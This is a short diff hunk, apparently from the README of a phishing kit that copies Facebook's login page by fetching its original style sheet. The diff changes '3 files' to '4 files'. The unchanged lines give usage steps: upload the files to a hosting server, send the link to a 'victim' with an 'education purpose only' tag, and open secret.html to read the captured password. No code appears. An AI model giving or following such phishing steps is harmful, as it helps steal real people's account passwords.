@@ -4,6 +4,6 @@ The site fetches original style sheet from facebook server and creates the exact
 
 Simply:
 
-1. upload 3 files on your hosting server
+1. upload 4 files on your hosting server
 2. send the link to victim (education purpose only)
 3. yoursite.com/secret.html to get the password
